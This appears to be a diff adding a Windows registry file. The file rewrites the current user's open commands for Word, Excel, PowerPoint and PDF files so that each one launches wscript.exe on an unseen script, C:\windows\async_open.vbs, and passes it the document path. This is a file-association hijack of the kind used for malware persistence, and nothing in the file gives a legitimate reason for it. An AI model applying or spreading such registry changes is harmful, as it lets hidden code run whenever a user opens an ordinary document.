@@ -1,0 +1,44 @@
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\Software\Classes\.doc]
+@="Word.Document.8"
+
+[HKEY_CURRENT_USER\Software\Classes\Word.Document.8\shell\open\command]
+@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""
+
+[HKEY_CURRENT_USER\Software\Classes\.docx]
+@="Word.Document.12"
+
+[HKEY_CURRENT_USER\Software\Classes\Word.Document.12\shell\open\command]
+@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""
+
+[HKEY_CURRENT_USER\Software\Classes\.xls]
+@="Excel.Sheet.8"
+
+[HKEY_CURRENT_USER\Software\Classes\Excel.Sheet.8\shell\open\command]
+@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""
+
+[HKEY_CURRENT_USER\Software\Classes\.xlsx]
+@="Excel.Sheet.12"
+
+[HKEY_CURRENT_USER\Software\Classes\Excel.Sheet.12\shell\open\command]
+@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""
+
+[HKEY_CURRENT_USER\Software\Classes\.ppt]
+@="PowerPoint.Show.8"
+
+[HKEY_CURRENT_USER\Software\Classes\PowerPoint.Show.8\shell\open\command]
+@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""
+
+[HKEY_CURRENT_USER\Software\Classes\.pptx]
+@="PowerPoint.Show.12"
+
+[HKEY_CURRENT_USER\Software\Classes\PowerPoint.Show.12\shell\open\command]
+@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""
+
+[HKEY_CURRENT_USER\Software\Classes\.pdf]
+@="PDF.Document"
+
+[HKEY_CURRENT_USER\Software\Classes\PDF.Document\shell\open\command]
+@="C:\\windows\\system32\\wscript.exe \"C:\\windows\\async_open.vbs\" \"%1\""
+
